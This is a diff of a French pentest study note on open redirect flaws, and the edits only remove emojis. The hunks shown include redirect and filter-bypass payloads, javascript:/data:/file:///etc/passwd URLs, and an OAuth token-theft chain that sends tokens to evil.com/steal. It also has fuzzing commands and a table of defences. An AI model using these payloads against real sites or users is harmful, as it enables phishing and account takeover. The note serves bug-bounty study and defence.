@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# ↩️ Open Redirect
+# ↩Open Redirect
 
 > [!info] **En 1 phrase**
 > Open Redirect = l'application redirige la victime vers une URL **contrôlée par l'attaquant**,
@@ -23,7 +23,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -36,14 +36,14 @@ flowchart LR
     D --> H[Bypass whitelist<br>→ accès privilégié]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Le domaine affiché au clic est **celui du site légitime** (`https://vuln.com/...`).
 > La confiance de la victime (et des filtres anti-phishing) vient de là. La redirection,
 > elle, part ailleurs.
 
 ---
 
-## 🔁 Codes de statut HTTP de redirection
+## Codes de statut HTTP de redirection
 
 ```http
 3xx → le client doit suivre la redirection
@@ -56,12 +56,12 @@ flowchart LR
 308 Permanent Redirect  → conserve la méthode HTTP (même méthode, sans bascule en GET)
 ```
 
-> [!tip] 💡 En bug bounty, cible **en priorité** les endpoints qui redirigent avec **307/308**
+> [!tip] En bug bounty, cible **en priorité** les endpoints qui redirigent avec **307/308**
 > ou du JavaScript : ils conservent le **token** dans l'URL ou les headers lors du suivi.
 
 ---
 
-## 🧰 Payloads de base
+## Payloads de base
 
 ### Paramètres couramment vulnérables
 
@@ -102,13 +102,13 @@ https://example.com/redirect?url=data:text/html,<script>alert(1)</script>
 https://example.com/redirect?url=file:///etc/passwd
 ```
 
-> [!warning] ⚠️ `javascript:` et `data:` ne sont pertinents que si la "redirection" est faite
+> [!warning] `javascript:` et `data:` ne sont pertinents que si la "redirection" est faite
 > côté **JS/DOM** (`window.location = input`, `location.href`) → cela devient du **XSS DOM-based**.
 > Un simple `Location:` HTTP header **ne** suivra **jamais** un schéma `javascript:`.
 
 ---
 
-## 🚧 Bypass de validations
+## Bypass de validations
 
 ### Validation par préfixe
 
@@ -193,14 +193,14 @@ http://a.com／X.b.com                      # slash fullwidth U+FF0F → / aprè
 # Payloads : %E2%84%80 (℀), %EF%BC%8F (／), %E3%80%82 (。)
 ```
 
-> [!tip] 💡 **Règle d'or du bypass** : le WAF/filtre valide la chaîne **brute**,
+> [!tip] **Règle d'or du bypass** : le WAF/filtre valide la chaîne **brute**,
 > mais le navigateur (et souvent le serveur) **normalise** d'abord : décodage URL,
 > normalisation Unicode, backslash→slash, `@`→split user/host, `.` idéogramme→`.`.
 > Tout ce qui diffère entre les deux visions = bypass.
 
 ---
 
-## 🎫 Open Redirect → OAuth token leak
+## Open Redirect → OAuth token leak
 
 > C'est l'impact le plus grave : la redirection piégée se joue **pendant** le flux OAuth,
 > donc le token d'accès (et le code d'autorisation) est envoyé **à l'attaquant**.
@@ -244,7 +244,7 @@ redirect_uri=https://evil.com/steal
 # 5. Réutilise le token → prise de compte (OAuth account takeover)
 ```
 
-> [!warning] ⚠️ Les fournisseurs matures (Google...) appliquent une **whitelist stricte de
+> [!warning] Les fournisseurs matures (Google...) appliquent une **whitelist stricte de
 > `redirect_uri`** (match exact). Les vulns sont donc souvent **côté app custom** : callback
 > interne vulnérable, `redirect_uri` contrôlé par l'app, wildcard `*`, ou open redirect
 > **dans le callback** qui re-propage le token. Tester la combinaison : open redirect + OAuth.
@@ -253,7 +253,7 @@ redirect_uri=https://evil.com/steal
 
 ---
 
-## 📍 Autres contextes de redirection
+## Autres contextes de redirection
 
 ### URL de download / téléchargement
 
@@ -286,13 +286,13 @@ HTTP/1.1 302 Found
 Location: INPUT
 ```
 
-> [!tip] 💡 Cherche ces vecteurs au-delà des endpoints classiques : boutons "retour à la
+> [!tip] Cherche ces vecteurs au-delà des endpoints classiques : boutons "retour à la
 > page précédente", "après connexion", "après paiement/checkout", gestionnaires d'erreur
 > 404 avec URL réfléchie, liens "voir aussi". C'est souvent là que se cachent les redirects.
 
 ---
 
-## 🛠️ Outils & wordlists
+## Outils & wordlists
 
 ```bash
 # Détection par grep de paramètres suspects dans le code / crawls
@@ -325,13 +325,13 @@ destination target go redir continue view checkout_url image_url
 - **[Open-Redirect-Payloads (cujanovic)](https://github.com/cujanovic/Open-Redirect-Payloads)** : wordlist complète
 - **[OpenRedirex](https://github.com/devanshbatham/OpenRedirex)** : automatise le test des payloads (`python3 openredirex.py -u "https://vuln.com/redirect?url=FUZZ" -p payloads.txt`)
 
-> [!tip] 💡 Priorise : **paramètres déjà présents dans le traffic** (crawl Burp/ffuf) plutôt
+> [!tip] Priorise : **paramètres déjà présents dans le traffic** (crawl Burp/ffuf) plutôt
 > qu'un fuzz exhaustif, puis vérifie à la main dans le navigateur que le `Location` est bien
 > **suivi** (teste aussi avec curl qui ne suit pas pour voir le header brut).
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Mesure | Détail |
 |---|---|
@@ -347,9 +347,9 @@ destination target go redir continue view checkout_url image_url
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Tester en chaîne avec les autres vulns**
+> [!tip] **Tester en chaîne avec les autres vulns**
 > L'open redirect est rarement un but en soi : c'est un **multiplicateur**.
 > Combine-le avec :
 > - **Phishing** : `https://vuln.com/redirect?url=evil.com` affiche `vuln.com` dans l'email.
@@ -358,12 +358,12 @@ destination target go redir continue view checkout_url image_url
 > - **OAuth/SSO** : vol de token (voir plus haut).
 > - **Token CSRF / anti-CSRF** : certaines protections re-jouent l'URL de référence → la faire pointer vers nous.
 
-> [!warning] ⚠️ **Open redirect ≠ path traversal redirect**
+> [!warning] **Open redirect ≠ path traversal redirect**
 > - **Open redirect** : l'app renvoie une URL **complète externe** dans `Location` (`https://evil.com`) → le navigateur quitte le domaine.
 > - **Path traversal redirect** : le path contrôle une redirection **interne** (`/redirect/../admin`) → bypass d'access control sans quitter le domaine.
 > Distinguer les deux : si le `Location` commence par `/`, tu es plutôt sur du traversal/relative → teste l'accès à des ressources **privilégiées** du même site.
 
-> [!warning] ⚠️ **Pièges des parsers d'URL**
+> [!warning] **Pièges des parsers d'URL**
 > - **Deux décodages** : le serveur peut décoder `%25` une fois et le navigateur encore → `%252f%252f` devient `//` au final.
 > - **`?` et `#` coupent la chaîne** : un filtre qui fait `startswith("https://vuln.com")` est bypassé par `https://vuln.com?evil.com` (hôte = vuln.com, mais le navigateur lit `evil.com` après le schéma ? — **toujours tester dans le navigateur**, le parser d'URL fait foi).
 > - **`@`** : le contenu avant `@` est traité comme userinfo → `//evil.com@vuln.com` pointe vers `evil.com`.
@@ -372,17 +372,17 @@ destination target go redir continue view checkout_url image_url
 > - **Validation par préfixe/`contains`** : toujours contournable, utiliser un match **exact** post-normalisation.
 > - **Faux positifs** : une redirection vers un **sous-domaine du même domaine** (`//sub.vuln.com`) est légitime MAIS devient dangereuse si le sous-domaine est pris (`subdomain takeover`) → ça redevient un open redirect exploitable.
 
-> [!tip] 💡 **Méthodo rapide de test**
+> [!tip] **Méthodo rapide de test**
 > 1. Identifier les paramètres de redirection (crawl + fuzz). 2. Tester `https://evil.com` → ok ? 3. Tester `//evil.com` (bypass scheme). 4. Tester `@`, `\`, `%2f`, Unicode. 5. Vérifier la **position du payload** dans le `Location` brut. 6. Vérifier en **navigateur** (pas juste curl). 7. Chaîner avec OAuth/XSS/SSRF pour mesurer l'impact réel.
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]]
-- [[SSRF|🌐 SSRF]]
-- [[XSS (Cross-Site Scripting)|🎣 Phishing]]
-- [[Path Traversal|📂 Path Traversal]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — Open URL Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20URL%20Redirect/README.md)
-- 🧪 Labs : [PortSwigger — DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection) · [Root-Me — HTTP Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
+- [[XSS (Cross-Site Scripting)| XSS]]
+- [[SSRF| SSRF]]
+- [[XSS (Cross-Site Scripting)| Phishing]]
+- [[Path Traversal| Path Traversal]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — Open URL Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20URL%20Redirect/README.md)
+- Labs : [PortSwigger — DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection) · [Root-Me — HTTP Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
